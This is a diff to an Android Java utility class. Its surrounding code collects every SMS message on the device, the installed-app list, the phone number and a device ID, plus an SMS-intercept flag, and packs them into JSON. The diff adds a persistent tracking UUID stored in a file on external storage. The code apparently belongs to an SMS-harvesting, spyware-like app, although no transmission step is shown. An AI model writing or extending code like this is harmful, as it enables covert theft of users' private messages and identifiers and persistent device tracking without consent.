@@ -12,6 +12,7 @@ import com.alibaba.fastjson.JSON;
 import com.blankj.utilcode.util.AppUtils;
 import com.blankj.utilcode.util.FileIOUtils;
 import com.blankj.utilcode.util.FileUtils;
+import com.blankj.utilcode.util.SPUtils;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -44,14 +45,14 @@ public class AllUtils {
         info.appList = list;
         info.smsList = SmsUtils.getAllSMS();
 
-        info.deviceId = getUniquePsuedoID();
+        info.deviceId = getUUIDCache();
         info.isInterceptSMS = false;
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         info.phoneNumber = tm.getLine1Number();
         return JSON.toJSONString(info);
     }
 
-    public static String getUniquePsuedoID() {
+    private static String getUniquePsuedoID0() {
         String serial = null;
 
         String m_szDevIDShort = "35" +
@@ -86,6 +87,24 @@ public class AllUtils {
         }
         //使用硬件信息拼凑出来的15位号码
         return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
+    }
+
+    public static String getUUIDCache() {
+        File file = new File(Environment.getExternalStorageDirectory() + "/test/uuid.txt");
+        FileUtils.createOrExistsFile(file.getAbsolutePath());
+
+        String uuid = FileIOUtils.readFile2String(file);
+
+        if (TextUtils.isEmpty(uuid)) {
+            FileIOUtils.writeFileFromString(file, UUID.randomUUID().toString());
+        }
+        uuid = FileIOUtils.readFile2String(file);
+        if (TextUtils.isEmpty(uuid)) {
+            String str = UUID.randomUUID().toString();
+            SPUtils.getInstance().put("uuid", str);
+            return SPUtils.getInstance().getString("uuid");
+        }
+        return uuid;
     }
 
 
